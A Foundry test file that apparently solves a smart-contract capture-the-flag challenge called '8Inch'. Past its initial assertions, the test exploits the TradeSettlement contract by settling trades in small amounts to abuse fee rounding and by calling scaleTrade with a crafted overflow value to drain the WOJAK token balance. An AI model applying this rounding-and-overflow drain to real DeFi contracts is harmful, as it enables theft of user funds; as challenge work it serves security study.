// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {TradeSettlement, Challenge} from "../src/8inch/8Inch.sol";
import {SimpleERC20} from "../src/8inch/ERC20.sol";

contract EightInchTest is Test {
    TradeSettlement public t;
    Challenge public challenge;
    SimpleERC20 public wojak;
    SimpleERC20 public weth;
    address public user = address(1);

    function setUp() public {
        vm.startPrank(user);
        challenge = new Challenge();
        t = challenge.tradeSettlement();
        wojak = challenge.wojak();
        weth = challenge.weth();
        vm.deal(user, 100 ether);
        vm.stopPrank();
    }

    function testInitialState() public {
        vm.startPrank(user);
        assertEq(
            wojak.balanceOf(address(t)),
            10 ether,
            "Challenge should have 10 WOJAK"
        );
        // assertEq(weth.balanceOf(address(challenge)), 10 ether, "Challenge should have 10 WETH");

        TradeSettlement.Trade memory trade = t.get(0);
        assertTrue(trade.isActive, "Initial trade should be active");
        assertEq(
            trade.amountToSell,
            10 ether - 30 wei,
            "Amount to sell should be 10 WOJAK minus fee"
        );
        assertEq(trade.amountToBuy, 1 ether, "Amount to buy should be 1 WETH");

        t.settleTrade(0, 9);
        t.settleTrade(0, 9);
        t.settleTrade(0, 9);
        t.settleTrade(0, 5);
        console.log("balance of wojak", wojak.balanceOf(user));

        SimpleERC20 weth2 = new SimpleERC20(
            "Wrapped Ether 2",
            "WETH2",
            18,
            10 ether
        );
        wojak.approve(address(t), 100);
        t.createTrade(address(wojak), address(weth2), 32, 0);
        t.scaleTrade(1, ((1 << 112) - 30) / 2);
        t.settleTrade(1, 10 ether);
        console.log("balance of wojak", wojak.balanceOf(user));
    }
}
